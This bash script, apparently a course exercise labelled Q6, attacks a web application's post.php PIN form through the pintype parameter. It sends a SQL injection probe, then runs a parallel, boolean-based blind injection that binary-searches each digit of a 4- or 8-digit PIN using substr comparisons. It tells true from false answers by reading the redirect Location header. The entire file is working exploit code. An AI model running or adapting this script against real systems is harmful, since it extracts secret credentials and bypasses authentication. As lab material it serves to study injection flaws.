#!/bin/bash

if [ $# -ne 2 ]
then
echo "Usage: $0 <url> <string>"
exit 1
fi

#Q6.a
if [ "$2" = "response" ]; then
  response=$(curl -i "$1/post.php" \
  -d "pintype=short' AND 1 = 2;"\
  -d "form=pin")


  echo "$response" > response.txt
  echo "$response"


#Q6.b
elif [ "$2" = "short" ]; then
  l1=1 r1=9 l2=1 r2=9 l3=1 r3=9 l4=1 r4=9

  while [ $l1 -lt $r1 ] || [ $l2 -lt $r2 ] || [ $l3 -lt $r3 ] || [ $l4 -lt $r4 ]; do
    mid1=$(($l1 + ( $r1 - $l1 ) / 2))
    mid2=$(($l2 + ( $r2 - $l2 ) / 2))
    mid3=$(($l3 + ( $r3 - $l3 ) / 2))
    mid4=$(($l4 + ( $r4 - $l4 ) / 2))

    curl -o response1 -s -i "$1/post.php" -d "pintype=short' AND substr(pin, 1, 1) > '$mid1' ;" -d "form=pin" & \
    curl -o response2 -s -i "$1/post.php" -d "pintype=short' AND substr(pin, 2, 1) > '$mid2' ;" -d "form=pin" & \
    curl -o response3 -s -i "$1/post.php" -d "pintype=short' AND substr(pin, 3, 1) > '$mid3' ;" -d "form=pin" & \
    curl -o response4 -s -i "$1/post.php" -d "pintype=short' AND substr(pin, 4, 1) > '$mid4' ;" -d "form=pin"
    wait

    if cat "response1" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r1=$mid1
    else
      l1=$(($mid1+1))
    fi

    if cat "response2" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r2=$mid2
    else
      l2=$(($mid2+1))
    fi

    if cat "response3" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r3=$mid3
    else
      l3=$(($mid3+1))
    fi

    if cat "response4" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r4=$mid4
    else
      l4=$(($mid4+1))
    fi
    
    rm response1 response2 response3 response4


  done

  echo "$l1$l2$l3$l4"

elif [ "$2" = "long" ]; then
  l1=1 r1=9 l2=1 r2=9 l3=1 r3=9 l4=1 r4=9 l5=1 r5=9 l6=1 r6=9 l7=1 r7=9 l8=1 r8=9

  while [ $l1 -lt $r1 ] || [ $l2 -lt $r2 ] || [ $l3 -lt $r3 ] || [ $l4 -lt $r4 ] || [ $l5 -lt $r5 ] || [ $l6 -lt $r6 ] || [ $l7 -lt $r7 ] || [ $l8 -lt $r8 ]; do
    mid1=$(($l1 + ( $r1 - $l1 ) / 2))
    mid2=$(($l2 + ( $r2 - $l2 ) / 2))
    mid3=$(($l3 + ( $r3 - $l3 ) / 2))
    mid4=$(($l4 + ( $r4 - $l4 ) / 2))
    mid5=$(($l5 + ( $r5 - $l5 ) / 2))
    mid6=$(($l6 + ( $r6 - $l6 ) / 2))
    mid7=$(($l7 + ( $r7 - $l7 ) / 2))
    mid8=$(($l8 + ( $r8 - $l8 ) / 2))

    curl -o response1 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 1, 1) > '$mid1' ;" -d "form=pin" & \
    curl -o response2 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 2, 1) > '$mid2' ;" -d "form=pin" & \
    curl -o response3 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 3, 1) > '$mid3' ;" -d "form=pin" & \
    curl -o response4 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 4, 1) > '$mid4' ;" -d "form=pin" & \
    curl -o response5 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 5, 1) > '$mid5' ;" -d "form=pin" & \
    curl -o response6 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 6, 1) > '$mid6' ;" -d "form=pin" & \
    curl -o response7 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 7, 1) > '$mid7' ;" -d "form=pin" & \
    curl -o response8 -s -i "$1/post.php" -d "pintype=long' AND substr(pin, 8, 1) > '$mid8' ;" -d "form=pin"
    wait

    if cat "response1" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r1=$mid1
    else
      l1=$(($mid1+1))
    fi

    if cat "response2" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r2=$mid2
    else
      l2=$(($mid2+1))
    fi

    if cat "response3" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r3=$mid3
    else
      l3=$(($mid3+1))
    fi

    if cat "response4" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r4=$mid4
    else
      l4=$(($mid4+1))
    fi

    if cat "response5" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r5=$mid5
    else
      l5=$(($mid5+1))
    fi

    if cat "response6" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r6=$mid6
    else
      l6=$(($mid6+1))
    fi

    if cat "response7" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r7=$mid7
    else
      l7=$(($mid7+1))
    fi

    if cat "response8" | sed -n '9p' | grep -q "Location: pin_check.php?pin_status=-99"; then
      r8=$mid8
    else
      l8=$(($mid8+1))
    fi

    rm response1 response2 response3 response4 response5 response6 response7 response8

  done

  echo "$l1$l2$l3$l4$l5$l6$l7$l8"

else
  echo "Wrong input"
  exit 1
fi


